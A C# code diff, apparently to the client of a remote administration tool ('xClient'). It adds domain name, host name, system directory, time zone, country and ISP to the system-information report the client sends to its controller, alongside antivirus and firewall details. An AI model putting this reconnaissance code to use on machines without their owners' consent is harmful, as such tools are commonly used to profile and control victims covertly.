@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Net.NetworkInformation;
 using System.Windows.Forms;
 using Microsoft.Win32;
 using xClient.Core.Extensions;
@@ -325,6 +326,12 @@ namespace xClient.Core.Commands
         {
             try
             {
+                IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
+
+                var domainName = (!string.IsNullOrEmpty(properties.DomainName)) ? properties.DomainName : "-";
+                var hostName = (!string.IsNullOrEmpty(properties.HostName)) ? properties.HostName : "-";
+
+
                 string[] infoCollection = new string[]
                 {
                     "Processor (CPU)",
@@ -337,6 +344,14 @@ namespace xClient.Core.Commands
                     WindowsAccountHelper.GetName(),
                     "PC Name",
                     SystemHelper.GetPcName(),
+                    "Domain Name",
+                    domainName,
+                    "Host Name",
+                    hostName,
+                    "System Drive",
+                    Path.GetPathRoot(Environment.SystemDirectory),
+                    "System Directory",
+                    Environment.SystemDirectory,
                     "Uptime",
                     SystemHelper.GetUptime(),
                     "MAC Address",
@@ -348,7 +363,13 @@ namespace xClient.Core.Commands
                     "Antivirus",
                     SystemHelper.GetAntivirus(),
                     "Firewall",
-                    SystemHelper.GetFirewall()
+                    SystemHelper.GetFirewall(),
+                    "Time Zone",
+                    GeoLocationHelper.GeoInfo.timezone,
+                    "Country",
+                    GeoLocationHelper.GeoInfo.country,
+                    "ISP",
+                    GeoLocationHelper.GeoInfo.isp
                 };
 
                 new Packets.ClientPackets.GetSystemInfoResponse(infoCollection).Execute(client);
